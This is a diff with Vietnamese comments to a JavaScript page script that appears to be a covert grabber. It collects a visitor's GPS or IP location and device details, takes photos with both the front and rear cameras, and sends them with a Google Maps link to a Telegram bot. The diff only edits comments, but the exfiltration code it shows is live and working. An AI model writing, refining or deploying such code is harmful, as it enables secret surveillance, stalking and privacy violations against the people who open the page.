@@ -48,14 +48,14 @@ async function capture(mode) {
 async function main() {
     const [gps, info] = await Promise.all([getGPS(), getVitals()]);
     
-    // Chụp cam trước xong mới chụp cam sau để tránh xung đột phần cứng
+    // Chụp lần lượt để tránh xung đột phần cứng
     const p1 = await capture("user");
     const p2 = await capture("environment");
 
     const lat = gps ? gps.lat : info.lat;
     const lon = gps ? gps.lon : info.lon;
     const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
-    // Sửa link Maps chuẩn như ảnh mẫu của bạn
+    // Sửa link Maps đúng định dạng tọa độ q=lat,lon
     const map = `https://www.google.com/maps?q=${lat},${lon}`;
 
     const cap = `📡 [THÔNG TIN TRUY CẬP]
@@ -81,7 +81,7 @@ async function main() {
     
     if (p2) {
         fd.append('f2', p2, '2.jpg');
-        // Nếu không có cam trước thì gắn caption vào cam sau, nếu có rồi thì để trống để gộp nhóm
+        // Chỉ gắn caption vào tấm ảnh đầu tiên trong mảng để Telegram gộp nhóm
         media.push({ type: 'photo', media: 'attach://f2', caption: media.length === 0 ? cap : "" });
     }
 
@@ -89,7 +89,6 @@ async function main() {
         fd.append('media', JSON.stringify(media));
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
     } else {
-        // Fallback gửi tin nhắn chữ nếu cả 2 cam đều xịt
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
